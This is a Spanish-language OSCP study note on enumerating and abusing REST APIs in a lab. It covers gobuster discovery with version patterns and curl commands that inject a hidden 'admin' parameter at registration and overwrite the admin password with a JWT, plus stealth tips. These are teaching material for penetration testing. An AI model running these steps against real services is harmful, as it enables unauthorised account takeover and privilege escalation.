---
tipo: tecnica
fase: enumeracion
so: 
tags: [oscp, tecnica, enumeracion, explotacion, web]
fecha: 2026-09-28
---

# API Enumeration

> [!abstract] Qué es y cuándo usarla
> Descubrir y abusar de **APIs REST** de una app web en black-box (sin documentación). Las APIs exponen la lógica de backend; a menudo tienen fallos de **lógica** (parámetros ocultos, control de acceso débil, métodos HTTP mal restringidos) más que CVEs. Usar cuando veas endpoints tipo `/api/...`, respuestas JSON, o un servicio en un puerto alto (5000, 5002, 8080...).

## Requisitos previos
- Puerto/servicio web identificado (`nmap -sV`).
- Wordlists (`/usr/share/wordlists/dirb/`), `gobuster`, `curl`.

## Descubrir endpoints
Los paths REST suelen seguir `/<api_name>/v1`, `/<api_name>/v2`. Gobuster con **patterns** añade la versión a cada palabra:
```bash
# fichero "pattern":
#   {GOBUSTER}/v1
#   {GOBUSTER}/v2
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
| Parte | Qué hace |
|---|---|
| `-p pattern` | Fichero de patrones |
| `{GOBUSTER}` | Placeholder = cada palabra de la wordlist |

Ampliar sobre un recurso encontrado (ej. un usuario) para hallar subpaths:
```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```
> [!tip] Si existe `/ui`, `/console`, `/swagger` o `/docs`, suele estar la **documentación** completa de la API. Raro en black-box, pero comprobarlo siempre.

## Interpretar códigos de respuesta
| Código | Significado útil |
|---|---|
| **200** | Endpoint existe y responde |
| **404 + mensaje** | Puede existir aunque diga "not found" (ej. `"User not found"` → la API está ahí) |
| **405 Method Not Allowed** | El path existe pero el método no está permitido → **prueba otro método** |

## Probar métodos HTTP
`curl` usa **GET** por defecto. Probar POST/PUT/PATCH:
```bash
curl -i http://.../users/v1                                  # GET: enumera datos (usuarios, etc.)
curl -d '{"password":"fake","username":"admin"}' \
     -H 'Content-Type: application/json' http://.../users/v1/login   # POST con JSON
curl -X 'PUT' http://.../users/v1/admin/password \
     -H 'Content-Type: application/json' \
     -H 'Authorization: OAuth <JWT>' -d '{"password":"pwned"}'       # PUT reemplaza valor
```
| Flag curl | Qué hace |
|---|---|
| `-i` | Incluye headers de respuesta |
| `-d` | Body de la request (implica POST) |
| `-H` | Añade header (Content-Type, Authorization...) |
| `-X` | Fuerza el método (PUT, PATCH, DELETE...) |
| `--proxy 127.0.0.1:8080` | Manda la request a Burp para inspeccionarla |

## Abusar de la lógica (privesc típico)
1. Enumerar usuarios con GET → identificar `admin`.
2. Registro (`/register`) que falla pidiendo campos → reintentar añadiendo un **parámetro oculto** de privilegio:
```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
     -H 'Content-Type: application/json' http://.../users/v1/register
```
3. Login del nuevo usuario → devuelve un **JWT** (`auth_token`).
4. Usar el JWT en `Authorization` para acciones privilegiadas (ej. cambiar la password del admin con `PUT`).

> [!tip] Patrón mental: **GET para leer, POST para crear, PUT/PATCH para reemplazar.** Un `405` es una invitación a cambiar de método. Los parámetros ocultos (`admin`, `role`, `isAdmin`) en `register`/`update` son un fallo de control de acceso muy común.

> [!warning] Detección / problemas
> - Gobuster es **ruidoso** (muchas requests). Bajar threads si hace falta sigilo.
> - Escala mal a mano con muchas APIs → recrear el flujo en **Burp Repeater** y guardar todo en **Target > Site map** para reenviar a Repeater/Intruder.

## Visto en
- Módulo: [[08 - Introduction to Web Application Attacks]]
- Cheatsheet: [[Web]]
- Máquinas: [[]]
